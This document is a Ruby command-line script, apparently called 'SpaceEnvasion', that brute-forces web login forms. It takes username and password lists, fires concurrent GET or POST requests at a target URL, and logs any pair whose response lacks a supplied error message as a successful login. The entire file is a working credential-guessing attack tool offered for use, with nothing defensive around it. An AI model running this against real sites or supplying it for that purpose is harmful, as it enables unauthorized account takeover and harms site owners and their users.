#!/usr/bin/env ruby
# frozen_string_literal: true

require 'net/http'
require 'open-uri'
require 'optparse'
require 'nokogiri'
require 'uri'
require 'logger'
require 'thread'
require 'thwait'

class SpaceEnvasion
  def initialize
    @options = {}
    @logger = Logger.new('space_envasion.log')
    @logger.level = Logger::DEBUG
  end

  def parse_options
    OptionParser.new do |opt|
      opt.banner = "\nUsage: ./space_envasion.rb [options]"
      opt.on("-t", "--target TARGET", "Target URL") { |target| @options[:target] = target }
      opt.on("-m", "--method METHOD", "HTTP method (GET or POST)") { |method| @options[:method] = method }
      opt.on("-u", "--username USER_VALUE", "Username value") { |username| @options[:username] = username }
      opt.on("-p", "--password PASSWORD_VALUE", "Password value") { |password| @options[:password] = password }
      opt.on("-U", "--users-list FILE", "File with list of usernames") { |file| @options[:users_list] = file }
      opt.on("-P", "--passwords-list FILE", "File with list of passwords") { |file| @options[:passwords_list] = file }
      opt.on("-e", "--error-msg MESSAGE", "Authentication error message") { |msg| @options[:error_msg] = msg }
      opt.on("-c", "--concurrency NUMBER", Integer, "Number of concurrent threads") { |c| @options[:concurrency] = c || 10 }
      opt.on("-s", "--stop-on-success", "Stop after first successful login") { |s| @options[:stop_on_success] = s }
      opt.on("-h", "--help", "Show this help message and exit") { puts opt; exit }
    end.parse!

    validate_options
    @options
  end

  def validate_options
    missing = []
    %i[target method error_msg].each do |option|
      missing << option if @options[option].nil?
    end
    unless %w[GET POST].include?(@options[:method].upcase)
      missing << 'valid method (GET or POST)'
    end
    raise ArgumentError, "Missing required options: #{missing.join(', ')}" unless missing.empty?
  end

  def bruteforce
    usernames = load_file(@options[:users_list]) || [@options[:username]]
    passwords = load_file(@options[:passwords_list]) || [@options[:password]]
    threads = []

    usernames.each do |username|
      passwords.each do |password|
        while threads.size >= @options[:concurrency]
          ThreadsWait.all_waits(*threads)
          threads.reject!(&:status)
        end

        threads << Thread.new { try_login(username, password) }
      end
    end

    ThreadsWait.all_waits(*threads)
  end

  def try_login(username, password)
    url = URI(@options[:target])
    parameters = { username: username, password: password }

    begin
      response = if @options[:method].upcase == 'POST'
                   Net::HTTP.post_form(url, parameters)
                 else
                   uri = URI("#{@options[:target]}?#{URI.encode_www_form(parameters)}")
                   Net::HTTP.get_response(uri)
                 end

      if response.body.include?(@options[:error_msg])
        log_info("Failed login: #{username} / #{password}")
      else
        log_success("Successful login: #{username} / #{password}")
        puts "*** Successful login found! Username: #{username}, Password: #{password} ***"
        exit if @options[:stop_on_success]
      end
    rescue => e
      log_error("Error during request: #{e.message}")
    end
  end

  def load_file(filename)
    return unless filename

    File.read(filename).split("\n").reject(&:empty?)
  end

  def log_info(message)
    @logger.info("[#{timestamp}] #{message}")
    puts message
  end

  def log_success(message)
    @logger.info("[#{timestamp}] #{message}")
    puts "\e[32m#{message}\e[0m"  # Green text
  end

  def log_error(message)
    @logger.error("[#{timestamp}] #{message}")
    puts "\e[31m#{message}\e[0m"  # Red text
  end

  def timestamp
    Time.now.strftime("%Y-%m-%d %H:%M:%S")
  end
end

space_envasion = SpaceEnvasion.new
options = space_envasion.parse_options
space_envasion.bruteforce
